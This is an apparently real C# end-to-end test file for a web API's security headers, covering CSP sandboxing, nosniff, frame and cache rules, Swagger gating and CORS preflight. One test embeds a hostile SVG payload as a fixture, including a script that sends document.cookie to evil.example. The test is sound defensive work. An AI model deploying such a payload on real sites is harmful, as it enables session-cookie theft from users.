using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using Vectorify.Api.Contracts;
using Vectorify.Api.Endpoints;
using Vectorify.Api.Security;
using Vectorify.Api.Tests.TestSupport;

namespace Vectorify.Api.Tests.EndToEnd;

/// <summary>
/// Cabeceras de seguridad de la API (M3.1-S09): en TODA respuesta (también las de error, 403 de CSRF, 429), CSP cerrada con <c>sandbox</c> para que un SVG o una descarga abiertos en una pestaña no
/// ejecuten scripts ni compartan origen con la API, <c>nosniff</c>, <c>X-Frame-Options</c>, <c>Referrer-Policy</c>, <c>Permissions-Policy</c> y <c>Cache-Control</c> adecuado. Swagger solo existe en Development.
/// </summary>
[Collection(AuthRecoveryCollection.Name)]
public sealed class SecurityHeadersTests : IAsyncLifetime
{
    private readonly AuthApiFixture _fixture;
    private readonly List<IAsyncDisposable> _disposables = [];
    private string _connectionString = string.Empty;

    public SecurityHeadersTests(AuthApiFixture fixture)
    {
        _fixture = fixture;
    }

    public async Task InitializeAsync() => _connectionString = await _fixture.CreateDatabaseAsync();

    public async Task DisposeAsync()
    {
        foreach (var disposable in _disposables)
        {
            await disposable.DisposeAsync();
        }
    }

    private RecoveryHost CreateHost(IDictionary<string, string?>? settings = null, string? environment = null)
    {
        var values = new Dictionary<string, string?>(settings ?? new Dictionary<string, string?>());
        if (environment == "Production")
        {
            values.TryAdd("Auth:Email:Mode", "Disabled");
            values.TryAdd("Auth:DataProtection:KeysPath", Path.Combine(Path.GetTempPath(), "vectorify-s09-keys-" + Guid.NewGuid().ToString("N")));
            values.TryAdd("Auth:Cookie:Name", RecoveryHost.CookieName);
        }

        var host = RecoveryHost.Create(_fixture, _connectionString, values, environment: environment);
        _disposables.Add(host);
        return host;
    }

    private static void AssertBaselineHeaders(HttpResponseMessage response, string because)
    {
        Assert.True(response.Headers.Contains("X-Content-Type-Options"), because);
        Assert.Equal("nosniff", Assert.Single(response.Headers.GetValues("X-Content-Type-Options")));
        Assert.Equal("no-referrer", Assert.Single(response.Headers.GetValues("Referrer-Policy")));
        Assert.Equal("DENY", Assert.Single(response.Headers.GetValues("X-Frame-Options")));
        Assert.Equal(SecurityHeadersMiddleware.ApiContentSecurityPolicy, Assert.Single(response.Headers.GetValues("Content-Security-Policy")));
        var permissions = Assert.Single(response.Headers.GetValues("Permissions-Policy"));
        Assert.Contains("camera=()", permissions);
        Assert.Contains("microphone=()", permissions);
        Assert.Contains("geolocation=()", permissions);
    }

    [Fact]
    public void TheApiContentSecurityPolicy_IsTheClosedOneThePlanSpecifies()
    {
        var csp = SecurityHeadersMiddleware.ApiContentSecurityPolicy;

        Assert.StartsWith("default-src 'none'", csp);
        Assert.Contains("frame-ancestors 'none'", csp);
        Assert.Contains("sandbox", csp);
        Assert.DoesNotContain("allow-same-origin", csp); // sin él, un SVG abierto en una pestaña tiene un origen opaco: no puede usar la cookie de sesión
        Assert.DoesNotContain("allow-scripts", csp);
        Assert.DoesNotContain("unsafe-eval", csp);
        Assert.DoesNotContain("script-src", csp);
    }

    [Fact]
    public async Task EveryKindOfResponse_CarriesTheSecurityHeaders_SuccessErrorCsrfRejectionAndRateLimit()
    {
        var host = CreateHost(new Dictionary<string, string?> { ["Auth:RateLimit:LoginIpPermitLimit"] = "1" });
        var ok = await host.Client.GetAsync("/health");
        var unauthorized = await host.Client.GetAsync(AuthEndpoints.MePath);
        var invalidCredentials = await host.PostAsync(AuthEndpoints.LoginPath, new LoginRequest(RecoveryHost.NewEmail(), "una-contrasena-erronea-9"), ip: "10.7.0.1");
        var rateLimited = await host.PostAsync(AuthEndpoints.LoginPath, new LoginRequest(RecoveryHost.NewEmail(), "una-contrasena-erronea-9"), ip: "10.7.0.1");
        using var noCsrf = host.Factory.CreateClient();
        var csrfRejected = await noCsrf.PostAsJsonAsync(AuthEndpoints.LoginPath, new LoginRequest("a@b.co", "x"));
        var notFound = await host.Client.GetAsync("/api/v1/does-not-exist");

        Assert.Equal(HttpStatusCode.OK, ok.StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, unauthorized.StatusCode);
        Assert.Equal(HttpStatusCode.Unauthorized, invalidCredentials.StatusCode);
        Assert.Equal(HttpStatusCode.TooManyRequests, rateLimited.StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, csrfRejected.StatusCode);
        foreach (var (name, response) in new[]
                 {
                     ("200 /health", ok), ("401 /me", unauthorized), ("401 login", invalidCredentials),
                     ("429 login", rateLimited), ("403 csrf", csrfRejected), ("fallback", notFound),
                 })
        {
            AssertBaselineHeaders(response, name);
        }
    }

    [Fact]
    public async Task CacheControl_IsNoStoreOnEveryAuthResponse_AndPrivateNoCacheOnTheRestOfTheApi()
    {
        // Revalidación de 5 min (no la de 0 de los demás tests): con 0 cada petición re-emite la cookie y el handler de cookies pone su propio no-store, y no se vería la cabecera por defecto.
        var host = CreateHost(new Dictionary<string, string?> { ["Auth:Session:RevalidationInterval"] = "00:05:00" });
        var email = await host.RegisterAsync();
        var cookie = await host.LoginCookieAsync(email);

        var authResponses = new List<HttpResponseMessage>
        {
            await host.PostAsync(AuthEndpoints.LoginPath, new LoginRequest(email, "mala-contrasena-1234")),
            await host.PostAsync(AuthEndpoints.LogoutAllPath, new { }), // 401 del framework: sin sesión, no pasa por el endpoint
            await host.Client.GetAsync(AuthEndpoints.MePath),
            await host.PostAsync(AuthRecoveryEndpoints.ChangePasswordPath, new ChangePasswordRequest("x", "y")), // 401 sin sesión
        };
        var meWithSession = new HttpRequestMessage(HttpMethod.Get, AuthEndpoints.MePath);
        meWithSession.Headers.Add("Cookie", cookie);
        authResponses.Add(await host.Client.SendAsync(meWithSession));

        foreach (var response in authResponses)
        {
            Assert.True(response.Headers.CacheControl?.NoStore == true, $"{response.RequestMessage?.RequestUri?.AbsolutePath}: {response.Headers.CacheControl}"); // el 401 del framework añade además no-cache
        }

        var projects = new HttpRequestMessage(HttpMethod.Get, "/api/v2/projects");
        projects.Headers.Add("Cookie", cookie);
        var list = await host.Client.SendAsync(projects);
        Assert.Equal(HttpStatusCode.OK, list.StatusCode);
        Assert.True(list.Headers.CacheControl is { Private: true, NoCache: true }); // privado (cookie): ninguna caché compartida lo guarda
        Assert.False((await host.Client.GetAsync("/health")).Headers.Contains("Cache-Control")); // fuera de /api no se fuerza nada
    }

    [Fact]
    public async Task Swagger_ExistsOnlyInDevelopment()
    {
        var development = CreateHost();
        var production = CreateHost(environment: "Production");

        var devDocument = await development.Client.GetAsync("/swagger/v1/swagger.json");
        var devUi = await development.Client.GetAsync("/swagger/index.html");
        var prodDocument = await production.Client.GetAsync("/swagger/v1/swagger.json");
        var prodUi = await production.Client.GetAsync("/swagger/index.html");

        Assert.Equal(HttpStatusCode.OK, devDocument.StatusCode);
        Assert.Equal(HttpStatusCode.OK, devUi.StatusCode);
        Assert.False(devUi.Headers.Contains("Content-Security-Policy")); // la UI de Swagger necesita scripts en línea: se exceptúa, y solo existe en Development
        Assert.False(prodDocument.IsSuccessStatusCode);
        Assert.False(prodUi.IsSuccessStatusCode);
        Assert.DoesNotContain("openapi", await prodDocument.Content.ReadAsStringAsync(), StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task AnUploadedSvgWithScripts_IsServedAsAnAttachment_WithNosniffAndASandboxedCsp()
    {
        // Modo Development anónimo (el flujo de desarrollo): Assets de /api/v2 con un SVG hostil (XML bien formado con <script>, onload y foreignObject).
        await using var factory = _fixture.CreateFactory(_connectionString);
        using var client = factory.CreateClient();
        var project = await (await client.PostAsJsonAsync("/api/v2/projects", new CreateProjectRequest("SVG hostil", null))).Content.ReadFromJsonAsync<ProjectResponse>();
        const string hostile =
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\">" +
            "<script>fetch('https://evil.example/?c='+document.cookie)</script>" +
            "<foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"/></foreignObject>" +
            "<use href=\"https://evil.example/x.svg#a\"/></svg>";
        using var form = new MultipartFormDataContent();
        var file = new ByteArrayContent(Encoding.UTF8.GetBytes(hostile));
        file.Headers.ContentType = new MediaTypeHeaderValue("image/svg+xml");
        form.Add(file, "file", "hostil.svg");
        form.Add(new StringContent("original"), "type");
        var upload = await client.PostAsync($"/api/v2/projects/{project!.Id}/assets", form);
        Assert.Equal(HttpStatusCode.Created, upload.StatusCode);
        var asset = await upload.Content.ReadFromJsonAsync<AssetResponse>();

        var download = await client.GetAsync($"/api/v2/projects/{project.Id}/assets/{asset!.Id}");

        Assert.Equal(HttpStatusCode.OK, download.StatusCode);
        Assert.Equal("image/svg+xml", download.Content.Headers.ContentType?.MediaType);
        Assert.Equal("attachment", download.Content.Headers.ContentDisposition?.DispositionType); // abrirlo directamente lo descarga en vez de renderizarlo
        AssertBaselineHeaders(download, "descarga de SVG");
        Assert.Contains("sandbox", Assert.Single(download.Headers.GetValues("Content-Security-Policy")));
        Assert.Equal(hostile, await download.Content.ReadAsStringAsync()); // los bytes no se tocan: la defensa es de entrega, no de reescritura
    }

    [Fact]
    public async Task APreflightFromAnAllowedOrigin_StillWorks_WithTheSecurityHeadersOnTheApi()
    {
        var host = CreateHost();
        var request = new HttpRequestMessage(HttpMethod.Options, AuthEndpoints.LoginPath);
        request.Headers.Add("Origin", CsrfTestExtensions.AllowedOrigin);
        request.Headers.Add("Access-Control-Request-Method", "POST");
        request.Headers.Add("Access-Control-Request-Headers", "content-type,x-vectorify-request");

        var response = await host.Client.SendAsync(request);

        Assert.True(response.IsSuccessStatusCode);
        Assert.Equal(CsrfTestExtensions.AllowedOrigin, Assert.Single(response.Headers.GetValues("Access-Control-Allow-Origin")));
        Assert.Equal("true", Assert.Single(response.Headers.GetValues("Access-Control-Allow-Credentials")));
    }
}
